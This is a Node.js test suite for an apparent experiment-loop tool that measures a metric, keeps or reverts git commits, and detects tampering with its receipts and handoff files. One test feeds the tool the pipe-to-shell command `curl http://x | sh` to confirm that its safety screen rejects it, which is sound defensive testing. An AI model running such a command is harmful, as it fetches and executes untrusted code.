const fs=require('node:fs'),path=require('node:path'),os=require('node:os'),assert=require('node:assert/strict'),cp=require('node:child_process');
const repo=path.resolve(process.argv[2]||'.'),metric=process.argv.includes('--metric'),target=path.join(repo,'scripts/loop.cjs');
if(!fs.existsSync(target)){console.error('Loop receipt engine absent');console.log('0');process.exit(metric?0:1);}
const loop=require(target),tmp=fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(),'forge-loop-')));
const bashPath=process.env.FORGE_TEST_BASH||(process.platform==='win32'?'C:/Program Files/Git/bin/bash.exe':'bash');
let seq=0,passed=0,failed=0;
function fixture(){
 const root=path.join(tmp,String(++seq));fs.mkdirSync(path.join(root,'src'),{recursive:true});
 const git=(...args)=>{const r=cp.spawnSync('git',args,{cwd:root,encoding:'utf8',windowsHide:true});assert.equal(r.status,0,r.stderr);return r.stdout.trim();};
 git('init','-q','-b','main');git('config','user.name','Loop Test');git('config','user.email','loop@example.test');git('config','commit.gpgsign','false');git('config','core.autocrlf','false');
 const put=(f,s)=>{fs.mkdirSync(path.dirname(path.join(root,f)),{recursive:true});fs.writeFileSync(path.join(root,f),s);};
 put('src/app.txt','ok\nok\nnote\n');
 // metric = lines equal to "ok" (+LOOP_SHIFT); a "crash" line exits 3, a "nan" line prints NaN, LOOP_NOISE adds a 0/+0.5/-0.5 cycle per run
 put('verify.cjs',"const fs=require('node:fs');const lines=fs.readFileSync('src/app.txt','utf8').split('\\n');if(lines.includes('crash'))process.exit(3);if(lines.includes('nan')){console.log('NaN');process.exit(0);}let n=lines.filter(l=>l==='ok').length+Number(process.env.LOOP_SHIFT||0);const c=process.env.LOOP_NOISE;if(c){const k=fs.existsSync(c)?Number(fs.readFileSync(c,'utf8')):0;fs.writeFileSync(c,String(k+1));n+=[0,0.5,-0.5][k%3];}console.log('coverage');console.log(n+'%');");
 put('guard.cjs',"process.exit(require('node:fs').readFileSync('src/app.txt','utf8').includes('bad')?1:0)");
 put('holdout.cjs',"console.log(require('node:fs').readFileSync('src/app.txt','utf8').split('\\n').filter(l=>l==='ok2').length)");
 put('.gitignore','forge/\n');git('add','-A');git('commit','-q','-m','init');
 const run=path.join(root,'forge','loop-test');
 const exec=(args,env={})=>{const e={...process.env,...env};delete e.FORGE_PROJECT_ROOT;const r=cp.spawnSync(process.execPath,[target,...args],{cwd:root,encoding:'utf8',windowsHide:true,env:e});return {...r,out:r.stdout+r.stderr};};
 const calibrate=(extra=[],env)=>exec(['calibrate',run,'--verify','node verify.cjs','--scope','src/**','--direction','higher','--goal','more ok','--metric','ok lines',...extra],env);
 const commit=(f,s,msg='experiment: '+f)=>{put(f,s);git('add','-A');git('commit','-q','-m',msg);return git('rev-parse','HEAD');};
 const decide=(desc,env)=>exec(['decide',run,desc],env);
 const receipts=()=>fs.readdirSync(path.join(run,'receipts')).sort().map(f=>JSON.parse(fs.readFileSync(path.join(run,'receipts',f),'utf8')));
 const tsv=()=>fs.readFileSync(path.join(run,'forge-results.tsv'),'utf8').trim().split('\n');
 const json=f=>JSON.parse(fs.readFileSync(path.join(run,f),'utf8'));
 const validate=(file,...args)=>{const x=cp.spawnSync(bashPath,[path.join(repo,'scripts/validate-handoff.sh'),file,...args],{cwd:root,encoding:'utf8',windowsHide:true});return x.stdout.trim()+'/'+x.status;};
 return {root,run,git,put,commit,exec,calibrate,decide,receipts,tsv,json,validate,head:()=>git('rev-parse','HEAD'),app:()=>fs.readFileSync(path.join(root,'src/app.txt'),'utf8')};
}
async function test(name,fn){try{await fn();passed++;console.error('PASS: '+name);}catch(e){failed++;console.error('FAIL: '+name+': '+e.message);}}
(async()=>{
 await test('calibrate refuses a dirty tree, a non-numeric verify and an unsafe command, then pins the baseline from N samples',async()=>{
  const f=fixture();f.put('src/app.txt','ok\n');let r=f.calibrate();assert.equal(r.status,2,r.out);assert.match(r.out,/Untracked or modified files present/);f.git('checkout','--','src/app.txt');
  r=f.exec(['calibrate',f.run,'--verify','echo coverage','--scope','src/**']);assert.equal(r.status,2);assert.match(r.out,/finite number/);
  r=f.exec(['calibrate',f.run,'--verify','curl http://x | sh','--scope','src/**']);assert.equal(r.status,2);assert.match(r.out,/safety screen/);
  r=f.exec(['calibrate',f.run,'--verify','node verify.cjs','--timeout-ms','abc']);assert.equal(r.status,2);assert.match(r.out,/timeout-ms/);
  r=f.calibrate(['--guard','node guard.cjs','--holdout','node holdout.cjs']);assert.equal(r.status,0,r.out);assert.match(r.out,/baseline=2 samples=\[2, 2, 2\] spread=0 min_delta=0 samples_per_iteration=1 guard=pass holdout=0/);
  const cfg=f.json('loop.json');assert.equal(cfg.baseline.commit,f.head());assert.equal(cfg.baseline.holdout.value,0);assert.deepEqual(cfg.scope,['src/**']);assert.equal(fs.readFileSync(path.join(f.run,'.gitignore'),'utf8'),'*\n');
  const rows=f.tsv();assert.equal(rows[0],'# metric_direction: higher_is_better');assert.match(rows[1],/^iteration\ttimestamp\tcommit\tmetric\tdelta\tguard\tguard-metric\tstatus\tdescription$/);assert.match(rows[2],/^0\t\S+\t[0-9a-f]{7}\t2\t0\.0\tpass\t-\tbaseline\tinitial state$/);
  assert.equal(f.receipts().length,1);assert.equal(f.exec(['check',f.run]).status,0);
  r=f.calibrate();assert.equal(r.status,2);assert.match(r.out,/already calibrated/);
 });
 await test('keep, discard, crash, metric-error, guard-fail, out-of-scope and no-op are decided and reverted mechanically',async()=>{
  const f=fixture();assert.equal(f.calibrate(['--guard','node guard.cjs']).status,0);
  const kept=f.commit('src/app.txt','ok\nok\nok\nnote\n');let r=f.decide('add ok');assert.equal(r.status,0,r.out);assert.match(r.out,/^DECISION: keep iteration=1 metric=3 delta=\+1 min_delta=0 guard=pass/m);assert.equal(f.head(),kept);
  const worse=f.commit('src/app.txt','ok\nnote\n');r=f.decide('remove ok');assert.equal(r.status,1,r.out);assert.match(r.out,/DECISION: discard iteration=2 metric=1 delta=-2/);assert.notEqual(f.head(),worse);assert.equal(f.app(),'ok\nok\nok\nnote\n');
  f.commit('src/app.txt','ok\nok\nok\nnote\ncrash\n');r=f.decide('crash');assert.equal(r.status,1);assert.match(r.out,/DECISION: crash/);assert.equal(f.app(),'ok\nok\nok\nnote\n');
  f.commit('src/app.txt','ok\nok\nok\nnote\nnan\n');r=f.decide('nan');assert.equal(r.status,1);assert.match(r.out,/DECISION: metric-error/);
  f.commit('src/app.txt','ok\nok\nok\nok\nbad\n');r=f.decide('ok but bad');assert.equal(r.status,1);assert.match(r.out,/DECISION: guard-fail iteration=5 metric=4 delta=\+1 min_delta=0 guard=fail/);assert.equal(f.app(),'ok\nok\nok\nnote\n');
  f.commit('verify.cjs','console.log(999)');r=f.decide('tamper');assert.equal(r.status,1);assert.match(r.out,/DECISION: out-of-scope/);assert.match(r.out,/out of scope: verify.cjs/);assert.equal(f.receipts()[6].verify,null);assert.match(fs.readFileSync(path.join(f.root,'verify.cjs'),'utf8'),/coverage/);
  r=f.decide('nothing');assert.equal(r.status,1);assert.match(r.out,/DECISION: no-op/);
  f.put('src/app.txt','dirty');r=f.decide('dirty');assert.equal(r.status,2);assert.match(r.out,/commit, ignore or remove/);f.git('checkout','--','src/app.txt');
  f.put('src/extra.txt','ok\n');r=f.decide('untracked');assert.equal(r.status,2);assert.match(r.out,/Untracked or modified files present/);fs.unlinkSync(path.join(f.root,'src/extra.txt'));
  const rows=f.tsv();assert.deepEqual(rows.slice(2).map(l=>l.split('\t')[7]),['baseline','keep','discard','crash','metric-error','guard-fail','out-of-scope','no-op']);
  assert.equal(rows[3].split('\t')[2],kept.slice(0,7));assert.equal(rows[4].split('\t')[2],'-');
  const rc=f.receipts();assert.ok(rc[2].commits.includes(worse));assert.equal(f.git('rev-parse',rc[2].reverted_head+'^{tree}'),f.git('rev-parse',rc[2].base+'^{tree}'));assert.equal(rc[7].head,rc[7].base);
  r=f.exec(['check',f.run]);assert.equal(r.status,0,r.out);assert.match(r.out,/LOOP CHECK: OK receipts=8 kept=1/);
 });
 await test('equal metric with less code is kept as simpler against the best kept value; multi-commit experiments revert whole; lower-is-better flips the sign',async()=>{
  const f=fixture();assert.equal(f.calibrate(['--min-delta','2']).status,0);
  f.commit('src/app.txt','ok\nnote\n');let r=f.decide('drop an ok, fewer lines');assert.equal(r.status,0,r.out);assert.match(r.out,/DECISION: keep \(simpler\) iteration=1 metric=1 delta=-1/);
  f.commit('src/app.txt','ok\nok\nok\nnote\n');r=f.decide('three ok');assert.equal(r.status,1,r.out);assert.match(r.out,/DECISION: discard iteration=2 metric=3 delta=\+1 min_delta=2/);
  f.commit('src/app.txt','ok\nok\nok\nok\nnote\n');r=f.decide('four ok');assert.equal(r.status,0,r.out);assert.match(r.out,/DECISION: keep iteration=3 metric=4 delta=\+2/);
  f.commit('src/app.txt','ok\nok\nok\nok\nnote\nextra\n');const second=f.commit('src/app.txt','ok\nok\nnote\nextra\nmore\n','experiment: second');r=f.decide('two commits');assert.equal(r.status,1,r.out);assert.match(r.out,/DECISION: discard/);
  const rc=f.receipts()[4];assert.equal(rc.commits.length,2);assert.equal(rc.commits[1],second);assert.equal(f.app(),'ok\nok\nok\nok\nnote\n');assert.equal(f.git('rev-list','--count',second+'..HEAD'),'2');
  assert.equal(f.exec(['check',f.run]).status,0);
  const g=fixture();assert.equal(g.exec(['calibrate',g.run,'--verify','node verify.cjs','--scope','src/**','--direction','lower']).status,0);
  g.commit('src/app.txt','ok\nnote\n');assert.match(g.decide('fewer').out,/DECISION: keep iteration=1 metric=1 delta=-1/);
  g.commit('src/app.txt','ok\nok\nok\n');assert.match(g.decide('more').out,/DECISION: discard/);
  r=g.exec(['summary',g.run]);assert.equal(r.status,0,r.out);assert.match(r.out,/metric: 2 -> 1 \(\+50%\) min_delta=0 lower_is_better; re-measured now: 1/);assert.match(r.out,/verdict: IMPROVED/);
 });
 await test('a noisy metric gets a calibrated floor: median of N samples per measurement and MinDelta = 2 x spread',async()=>{
  const f=fixture();const env={LOOP_NOISE:path.join(tmp,'noise-'+seq)};
  let r=f.calibrate([],env);assert.equal(r.status,0,r.out);const cfg=f.json('loop.json');assert.equal(cfg.baseline.value,2);assert.equal(cfg.baseline.spread,1);assert.equal(cfg.min_delta,2);assert.equal(cfg.samples_per_iteration,3);
  f.commit('src/app.txt','ok\nok\nok\nnote\n');r=f.decide('one more ok',env);assert.equal(r.status,1,r.out);assert.match(r.out,/DECISION: discard iteration=1 metric=3 delta=\+1 min_delta=2/);
  f.commit('src/app.txt','ok\nok\nok\nok\nnote\n');r=f.decide('two more ok',env);assert.equal(r.status,0,r.out);assert.match(r.out,/DECISION: keep iteration=2 metric=4 delta=\+2/);assert.equal(f.receipts()[2].verify.samples.length,3);
  r=f.exec(['summary',f.run],env);assert.equal(r.status,0,r.out);assert.match(r.out,/verdict: IMPROVED/);
  const g=fixture();r=g.calibrate(['--min-delta','0.25','--samples','5']);assert.equal(r.status,0,r.out);const c2=g.json('loop.json');assert.equal(c2.min_delta,0.25);assert.equal(c2.samples_per_iteration,5);assert.equal(c2.baseline.spread,0);
 });
 await test('a merge or empty commit in the range is refused before anything is recorded, then accepted once squashed',async()=>{
  const f=fixture();assert.equal(f.calibrate().status,0);const base=f.head();
  f.git('checkout','-q','-b','side');f.commit('src/app.txt','ok\nnote\n');f.git('checkout','-q','main');f.git('merge','-q','--no-ff','-m','merge side','side');const merged=f.head();
  let r=f.decide('merged');assert.equal(r.status,2,r.out);assert.match(r.out,/git revert failed, nothing recorded/);assert.equal(f.receipts().length,1);assert.equal(f.head(),merged);
  f.git('reset','-q','--soft',base);f.git('commit','-q','-m','experiment: squashed');r=f.decide('squashed');assert.equal(r.status,1,r.out);assert.match(r.out,/DECISION: discard/);assert.equal(f.app(),'ok\nok\nnote\n');
  f.git('commit','-q','--allow-empty','-m','experiment: empty');const head=f.commit('src/app.txt','ok\nnote\n');r=f.decide('empty plus worse');assert.equal(r.status,2,r.out);assert.match(r.out,/nothing recorded/);assert.equal(f.head(),head);assert.equal(f.receipts().length,2);
  f.git('reset','-q','--soft',f.receipts()[1].reverted_head);f.git('commit','-q','-m','experiment: worse');r=f.decide('worse');assert.equal(r.status,1,r.out);assert.match(r.out,/DECISION: discard/);assert.equal(f.exec(['check',f.run]).status,0);
 });
 await test('summary, handoff and check recompute from receipts; a holdout that stays flat marks OVERFIT; tampering anywhere fails the gate',async()=>{
  const f=fixture();assert.equal(f.calibrate(['--holdout','node holdout.cjs']).status,0);
  f.commit('src/app.txt','ok\nok\nok\nnote\n');assert.equal(f.decide('ok').status,0);f.commit('src/app.txt','ok\nnote\n');assert.equal(f.decide('worse').status,1);
  let r=f.exec(['summary',f.run,'--status','BOUNDED']);assert.equal(r.status,0,r.out);assert.match(r.out,/iterations=2 kept=1 discarded=1 crash=0/);assert.match(r.out,/metric: 2 -> 3 \(\+50%\)/);assert.match(r.out,/holdout: 0 -> 0 \(flat, spread 0\)/);assert.match(r.out,/verdict: OVERFIT/);assert.match(r.out,/top: #1 \+1 ok/);assert.match(r.out,/LOOP CHECK: OK/);
  const handoff=path.join(f.run,'handoff.json'),j=f.json('handoff.json');assert.equal(j.version,'3.4.0');assert.equal(j.source,'loop');assert.equal(j.status,'BOUNDED');assert.equal(j.results_tsv,'forge-results.tsv');assert.equal(j.loop.verdict,'OVERFIT');assert.equal(j.loop.kept,1);assert.equal(j.loop.final_remeasured,3);assert.equal(j.metric.value,3);assert.equal(j.config.verify,'node verify.cjs');assert.deepEqual(j.findings,['#1 +1 ok']);
  assert.equal(f.validate(handoff,'loop'),'VALID/0');assert.equal(f.validate(handoff),'VALID/0');assert.equal(f.validate(handoff,'loop','--require-pass'),'INVALID/1');
  const tsvFile=path.join(f.run,'forge-results.tsv'),tsv=fs.readFileSync(tsvFile,'utf8');fs.writeFileSync(tsvFile,tsv.replace('\tdiscard\t','\tkeep\t'));r=f.exec(['check',f.run]);assert.equal(r.status,1);assert.match(r.out,/rows differ from receipts/);assert.equal(f.validate(handoff,'loop'),'INVALID/1');assert.equal(f.validate(handoff),'INVALID/1');fs.writeFileSync(tsvFile,tsv);
  const rf=path.join(f.run,'receipts','001.json'),rj=fs.readFileSync(rf,'utf8');
  let edited=JSON.parse(rj);edited.value=30;fs.writeFileSync(rf,JSON.stringify(edited));assert.match(f.exec(['check',f.run]).out,/receipt 1: row does not match/);
  edited=JSON.parse(rj);edited.verify.samples[0].value=30;fs.writeFileSync(rf,JSON.stringify(edited));assert.match(f.exec(['check',f.run]).out,/receipt 1: verify status does not follow from its samples/);
  edited=JSON.parse(rj);edited.loc.removed=99;fs.writeFileSync(rf,JSON.stringify(edited));assert.match(f.exec(['check',f.run]).out,/receipt 1: changed files, scope or LOC differ from git/);
  fs.writeFileSync(rf,rj);assert.equal(f.exec(['check',f.run]).status,0);
  const cf=path.join(f.run,'loop.json'),cj=fs.readFileSync(cf,'utf8'),cfg=JSON.parse(cj);cfg.min_delta=0.5;fs.writeFileSync(cf,JSON.stringify(cfg));assert.match(f.exec(['check',f.run]).out,/loop\.json changed/);fs.writeFileSync(cf,cj);
  const hj=fs.readFileSync(handoff,'utf8');fs.writeFileSync(handoff,hj.replace('"kept": 1','"kept": 2'));assert.equal(f.validate(handoff,'loop'),'INVALID/1');assert.match(f.exec(['check',f.run,handoff]).out,/handoff\.json loop block/);fs.writeFileSync(handoff,hj);
  const sf=path.join(f.run,'summary.json'),sj=fs.readFileSync(sf,'utf8');fs.writeFileSync(sf,sj.replace('"verdict": "OVERFIT"','"verdict": "IMPROVED"'));assert.match(f.exec(['check',f.run]).out,/summary\.json does not match/);fs.writeFileSync(sf,sj);
  assert.equal(f.exec(['check',f.run]).status,0);const end=f.head();f.git('revert','--no-edit','HEAD');r=f.exec(['check',f.run]);assert.match(r.out,/HEAD has moved past the ledger end/);r=f.exec(['summary',f.run]);assert.equal(r.status,2);assert.match(r.out,/HEAD is not the ledger end/);
  f.git('reset','-q','--hard',end);assert.equal(f.exec(['check',f.run]).status,0);f.git('reset','-q','--hard',f.receipts()[0].head);assert.match(f.exec(['check',f.run]).out,/HEAD has moved past the ledger end/);
 });
 await test('a holdout that moves with the metric yields IMPROVED and passes --require-pass; no keeps yields UNCHANGED; an unreproducible final yields DRIFT',async()=>{
  const f=fixture();assert.equal(f.calibrate(['--holdout','node holdout.cjs']).status,0);f.commit('src/app.txt','ok\nok\nok\nok2\n');assert.equal(f.decide('ok and ok2').status,0);
  let r=f.exec(['summary',f.run]);assert.equal(r.status,0,r.out);assert.match(r.out,/holdout: 0 -> 1 \(moved, spread 0\)/);assert.match(r.out,/verdict: IMPROVED/);assert.equal(f.validate(path.join(f.run,'handoff.json'),'loop','--require-pass'),'VALID/0');
  r=f.exec(['summary',f.run],{LOOP_SHIFT:'5'});assert.equal(r.status,0,r.out);assert.match(r.out,/re-measured now: 8/);assert.match(r.out,/verdict: DRIFT/);assert.equal(f.validate(path.join(f.run,'handoff.json'),'loop'),'VALID/0');assert.equal(f.validate(path.join(f.run,'handoff.json'),'loop','--require-pass'),'INVALID/1');
  const g=fixture();assert.equal(g.calibrate().status,0);g.commit('src/app.txt','ok\nnote\n');assert.equal(g.decide('worse').status,1);r=g.exec(['summary',g.run]);assert.equal(r.status,0,r.out);assert.match(r.out,/kept=0 discarded=1/);assert.match(r.out,/verdict: UNCHANGED/);assert.equal(g.validate(path.join(g.run,'handoff.json'),'loop','--require-pass'),'INVALID/1');
  // receipts are unsigned: a forged but self-consistent ledger passes check and is caught by the final re-measurement
  const h=fixture();assert.equal(h.calibrate().status,0);h.commit('src/app.txt','ok\nok\nok\nnote\n');assert.equal(h.decide('ok').status,0);
  const hf=path.join(h.run,'receipts','001.json'),orig=JSON.parse(fs.readFileSync(hf,'utf8')),forged=JSON.parse(JSON.stringify(orig));
  forged.verify.samples[0].value=30;forged.verify.value=30;forged.value=30;forged.delta=28;forged.row=loop.row(forged);fs.writeFileSync(hf,JSON.stringify(forged));
  const ht=path.join(h.run,'forge-results.tsv');fs.writeFileSync(ht,fs.readFileSync(ht,'utf8').replace(orig.row,forged.row));
  assert.equal(h.exec(['check',h.run]).status,0);r=h.exec(['summary',h.run]);assert.equal(r.status,0,r.out);assert.match(r.out,/metric: 2 -> 30 .*re-measured now: 3/);assert.match(r.out,/verdict: DRIFT/);assert.equal(h.validate(path.join(h.run,'handoff.json'),'loop','--require-pass'),'INVALID/1');
 });
 await test('the run directory never rides along in an experiment commit, even when the project does not ignore forge/',async()=>{
  const f=fixture();f.put('.gitignore','');f.git('add','-A');f.git('commit','-q','-m','stop ignoring forge');assert.equal(f.calibrate().status,0);
  f.commit('src/app.txt','ok\nok\nok\n');assert.equal(f.git('status','--porcelain'),'');assert.equal(f.git('ls-files','forge'),'');let r=f.decide('ok');assert.equal(r.status,0,r.out);
  f.put('src/app.txt','ok\nok\nok\nok\n');f.git('add','-A');f.git('add','-f','forge/loop-test/loop.json');f.git('commit','-q','-m','experiment: sweeps the ledger');
  r=f.decide('swept');assert.equal(r.status,2,r.out);assert.match(r.out,/run directory is inside the experiment commit/);assert.equal(f.receipts().length,2);
  f.git('rm','-q','-r','--cached','forge/loop-test');f.git('commit','-q','--amend','--no-edit');r=f.decide('unswept');assert.equal(r.status,0,r.out);assert.equal(f.exec(['check',f.run]).status,0);
 });
 await test('validate-handoff requires the audited block for 3.4.0 loop handoffs; older loop records stay readable but never pass',()=>{
  const f=fixture();const file=path.join(f.root,'handoff.json'),base={source:'loop',status:'COMPLETE',timestamp:'2026-10-09T10:00:00Z',results_tsv:'forge-results.tsv'};
  fs.writeFileSync(file,JSON.stringify({version:'3.3.0',...base}));assert.equal(f.validate(file),'VALID/0');assert.equal(f.validate(file,'loop'),'VALID/0');assert.equal(f.validate(file,'loop','--require-pass'),'INVALID/1');
  fs.writeFileSync(file,JSON.stringify({version:'3.4.0',...base}));assert.equal(f.validate(file),'INVALID/1');assert.equal(f.validate(file,'loop'),'INVALID/1');
  fs.writeFileSync(file,JSON.stringify({version:'3.3.0',...base,source:'forge',loop:{verdict:'IMPROVED'}}));assert.equal(f.validate(file),'INVALID/1');
 });
 console.log(metric?passed:`${passed}/${passed+failed} loop receipt checks passed`);if(!metric&&failed)process.exitCode=1;
 try{fs.rmSync(tmp,{recursive:true,force:true});}catch{}
})().catch(e=>{console.error(e);process.exitCode=1;});
